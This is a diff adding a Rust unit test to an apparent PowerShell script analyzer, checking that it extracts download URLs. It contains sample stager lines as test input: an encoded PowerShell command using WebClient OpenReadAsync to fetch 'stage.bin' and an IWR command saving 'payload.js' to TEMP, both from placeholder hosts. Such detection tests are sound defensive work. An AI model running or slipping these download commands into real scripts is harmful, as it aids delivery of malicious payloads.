@@ -10170,6 +10170,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn webclient_openreadasync_schemeless_url_extracted() {
+        let ps =
+            r#"$wc=New-Object Net.WebClient;$wc.OpenReadAsync("openreadasync.example/stage.bin")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "http://openreadasync.example/stage.bin"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait for schemeless OpenReadAsync URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_positional_url_after_flags_extracted() {
         let ps = r#"IWR -useb 'https://iwr.example/payload.js' -outf $env:TEMP\payload.js"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
